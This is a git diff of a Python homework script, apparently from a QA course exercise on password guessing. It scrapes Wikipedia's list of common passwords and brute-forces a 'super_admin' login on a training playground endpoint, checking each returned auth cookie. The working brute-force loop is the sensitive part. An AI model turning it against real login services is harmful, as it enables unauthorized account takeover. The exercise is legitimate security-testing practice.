efaf5f967b5c667f0eaed3e94222bcdf3d552e88
nkiyashko <71321251+nkiyashko@users.noreply.github.com>
2021-10-19 16:43:55 +0300

    Update Ex9*: Подбор пароля.py

--- Ex9*: Подбор пароля.py
+++ Ex9*: Подбор пароля.py
@@ -1,13 +1,49 @@
 import requests
-from xml import html
+from lxml import html
 
-response = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
+def _get_passwords_from_wiki():
+    response = requests.post("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
+    html_tree = html.fromstring(response.text)
+    locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[@align="left"]/text()'
+    passwords = html_tree.xpath(locator)
 
-tree = html.fromstring(response.text)
+    striped_passwords = list(map(lambda x: str(x).strip(), passwords))
+    unique_passwords = list(dict.fromkeys(striped_passwords))
 
-locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[@align="left"]/text()'
-passwords = tree.xpath(locator)
+    return unique_passwords
+
+
+def _get_auth_cookie(login, password):
+    params = {"login": login, "password": password}
+    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=params)
+    return response.cookies.get_dict()["auth_cookie"]
+
+
+def _validate_cookie(cookie):
+    params = {"cookie": cookie}
+    response = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", params=params)
+    return response.text == "You are authorized"
+
+
+login = "super_admin"
+passwords = _get_passwords_from_wiki()
+success_password_count = 0
+failure_password_count = 0
+
+print("\nStart the process of brute force\n")
 
 for password in passwords:
-    password = str(password).strip()
-    print(password)
+    auth_cookie = _get_auth_cookie(login, password)
+    is_validate = _validate_cookie(auth_cookie)
+
+    if is_validate:
+        success_password_count += 1
+    else:
+        failure_password_count += 1
+
+    print("Auth is {}: login = [{}] password = [{}] cookie = [{}]".format(is_validate, login, password, auth_cookie))
+
+print("\nEnd the process of brute force\n"
+      "     success password count - {}\n".format(success_password_count) +
+      "     failure password count - {}".format(failure_password_count)
+)
